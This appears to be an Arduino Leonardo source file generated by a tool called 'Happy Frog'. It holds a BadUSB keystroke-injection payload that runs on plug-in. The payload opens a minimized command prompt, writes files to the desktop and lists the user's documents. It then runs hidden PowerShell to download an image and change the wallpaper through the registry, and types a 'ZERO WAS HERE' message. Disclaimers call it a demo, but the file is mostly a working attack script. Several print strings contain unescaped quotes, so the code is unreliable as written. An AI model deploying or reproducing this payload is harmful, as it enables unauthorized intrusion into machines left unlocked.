/*
Happy Frog - Arduino Leonardo Production Code
HID Emulation Script - Runs immediately on boot

Device: Arduino Leonardo
Processor: ATmega32u4
Framework: Arduino
Mode: Production (immediate execution)

⚠️ PRODUCTION MODE: This code runs immediately when device boots!
⚠️ Use only for authorized testing and educational purposes!
*/

#include <Keyboard.h>
#include <Mouse.h>

void setup() {
  // Initialize Leonardo for HID emulation
  Keyboard.begin();
  Mouse.begin();
  
  // Leonardo-specific startup delay
  delay(2000);  // Wait for system to recognize device
}

void loop() {
  // Production mode - execute payload immediately
  executePayload();
  
  // Leonardo: Efficient infinite loop for production
  while(true) {
    delay(1000);  // Prevent re-execution
  }
}

void executePayload() {
  // Generated Happy Frog payload for Arduino Leonardo

  // Production code - executes immediately on device boot/plug-in
  // ATTACKMODE HID STORAGE detected - running payload automatically

  // Wait for system to recognize the device
  delay(2000);

  // Leonardo Command: # Happy Frog Script - Converted from Ducky Script

  // Leonardo Command: # Original source: payloads/ducky.txt

  // Leonardo Command: # Educational conversion - review all commands before execution

  // Leonardo Command: # BadUSB Demo: Open Terminal, Notepad, and type a message

  // Leonardo Command: ATTACKMODE HID STORAGE
  // ATTACKMODE: Configured for HID emulation (HID STORAGE)
  // Note: This device is configured as a HID keyboard/mouse
  // Configuration: HID STORAGE

  // Leonardo Command: DELAY 2000
  delay(2000);  // Leonardo delay: 2000ms

  // Leonardo Command: # Open File Explorer

  // Leonardo Command: MOD e
  // Leonardo optimized modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('E');  // Press e
  Keyboard.release('E');  // Release e
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Leonardo Command: DELAY 1000
  delay(1000);  // Leonardo delay: 1000ms

  // Leonardo Command: # Open Hidden Command Prompt

  // Leonardo Command: MOD r
  // Leonardo optimized modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('R');  // Press r
  Keyboard.release('R');  // Release r
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Leonardo Command: DELAY 500
  delay(500);  // Leonardo delay: 500ms

  // Leonardo Command: STRING start /min cmd
  Keyboard.print("start /min cmd");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 1500
  delay(1500);  // Leonardo delay: 1500ms

  // Leonardo Command: # Create "Demo" directory and files in one reliable command

  // Leonardo Command: STRING mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"
  Keyboard.print("mkdir "%USERPROFILE%\Desktop\Demo" 2>nul && echo Demo file created at %date% %time% > "%USERPROFILE%\Desktop\Demo\README.txt" && echo This is a security demonstration file. > "%USERPROFILE%\Desktop\Demo\demo.txt" && echo If you can read this, your system was accessed via HID device. > "%USERPROFILE%\Desktop\Demo\warning.txt"");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 1000
  delay(1000);  // Leonardo delay: 1000ms

  // Leonardo Command: # Search for common document types (globally usable)

  // Leonardo Command: STRING for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  Keyboard.print("for /r "%USERPROFILE%\Documents" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 1000
  delay(1000);  // Leonardo delay: 1000ms

  // Leonardo Command: STRING for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"
  Keyboard.print("for /r "%USERPROFILE%\Desktop" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> "%USERPROFILE%\Desktop\Demo\file_list.txt"");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 1000
  delay(1000);  // Leonardo delay: 1000ms

  // Leonardo Command: # Change wallpaper to hacker skull (stealth version)

  // Leonardo Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait
  Keyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-NonInteractive", "-Command", "powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\Demo\wallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\Demo\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"" -Wait");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 3000
  delay(3000);  // Leonardo delay: 3000ms

  // Leonardo Command: # Open Notepad

  // Leonardo Command: MOD r
  // Leonardo optimized modifier combo
  Keyboard.press(KEY_LEFT_GUI);  // Press MOD
  Keyboard.press('R');  // Press r
  Keyboard.release('R');  // Release r
  Keyboard.release(KEY_LEFT_GUI);  // Release MOD

  // Leonardo Command: DELAY 500
  delay(500);  // Leonardo delay: 500ms

  // Leonardo Command: STRING notepad
  Keyboard.print("notepad");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 1500
  delay(1500);  // Leonardo delay: 1500ms

  // Leonardo Command: # Type simple hacker message in Notepad (replacing ASCII art)

  // Leonardo Command: STRING ZERO WAS HERE
  Keyboard.print("ZERO WAS HERE");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 500
  delay(500);  // Leonardo delay: 500ms

  // Leonardo Command: STRING never trust an open machine
  Keyboard.print("never trust an open machine");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: DELAY 500
  delay(500);  // Leonardo delay: 500ms

  // Leonardo Command: STRING *** DEMO: Demo files have been created. This is a security demonstration. ***
  Keyboard.print("*** DEMO: Demo files have been created. This is a security demonstration. ***");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: STRING To protect your data, always lock your machine and use strong passwords.
  Keyboard.print("To protect your data, always lock your machine and use strong passwords.");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: STRING This was a demo. Next time, don't plug in random USB drives or borrow chargers!
  Keyboard.print("This was a demo. Next time, don't plug in random USB drives or borrow chargers!");  // Leonardo string input

  // Leonardo Command: ENTER
  Keyboard.press(KEY_RETURN);  // Leonardo key press: ENTER
  Keyboard.release(KEY_RETURN);  // Leonardo key release: ENTER

  // Leonardo Command: # Conversion completed by Happy Frog

  // Leonardo Command: # Remember: Use only for educational purposes and authorized testing!

  // End of Happy Frog payload
}

/*
End of Happy Frog Production Code for Arduino Leonardo

Production Notes:
- This code runs immediately on device boot
- Optimized for native USB HID emulation
- ATmega32u4 processor provides reliable USB communication
- Classic choice for security research and automation

For more information, visit: https://github.com/ZeroDumb/happy-frog
*/